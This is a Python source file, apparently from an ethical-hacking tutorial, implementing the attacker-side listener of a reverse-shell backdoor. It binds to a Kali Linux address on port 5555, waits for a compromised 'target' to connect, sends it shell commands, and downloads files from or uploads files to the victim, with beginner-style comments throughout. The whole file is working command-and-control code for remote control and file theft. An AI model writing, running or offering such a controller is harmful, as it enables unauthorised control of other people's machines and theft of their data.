import socket 
import json #Java script Object Notation(format to transmit data over systems)
import os

def reliable_send(data):
	jsondata=json.dumps(data) #fuction will convert subset of python objects into json strings
	target.send(jsondata.encode()) #First data is encoded and then sent to the target machine

def reliable_recv():
	data=''
	while(True):
		try:
			data=data+target.recv(1024).decode().rstrip() #Specify amount of bytes that we want to recieve,then the data is decoded and then striped off any additional characters.
			return json.loads(data) #pasrse a json string and convert it to python object
		except ValueError:
			continue

def download_file(file_name):
	f=open(file_name,'wb')	#We store(write) the contents of the file we want to download from the backdoor to our server so we use writebytes mode
	target.settimeout(1) #As it might get stuck and not allow us to download the file
	chunk=target.recv(1024) #chunk=>small parts of data that we recieve
	while chunk:
		f.write(chunk)
		try:
			chunk=target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None) #Removing the statement target.settimeout(1)
	f.close()

def upload_file(file_name):
        f=open(file_name,'rb')
        target.send(f.read())

def target_Communication():
	while(True):
		command=input('* Shell~%s:'%str(ip)) #%s will get exchanged with the ip adderess
		reliable_send(command) #send the command to the target system
		if command=='quit':
			break
		elif command[:3]=='cd':
			pass
		elif command=='clear':
			os.system('clear') #.system allows us to specify any command that we want to run on the terminal
		elif command[:8]=='download': #download has 8 charc
			download_file(command[9:]) 
		elif command[:6]=='upload':
			upload_file(command[7:])
		else:
			result=reliable_recv()
			print(result)

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
#socket.AF_INET=>IPv4add
#socket.SOCK_STREAM=>TCP

sock.bind(('10.0.2.15',5555)) #Binded our kali Linux with the port(established connection with local machine)
print('[+] Listning For the Incoming Connections')
sock.listen(5) #We Listen upto 5 differnt connections
target,ip=sock.accept() #Accepting the incoming connection and  storing the target and ip address
print('[+] Target Connected From:'+str(ip))
target_Communication()
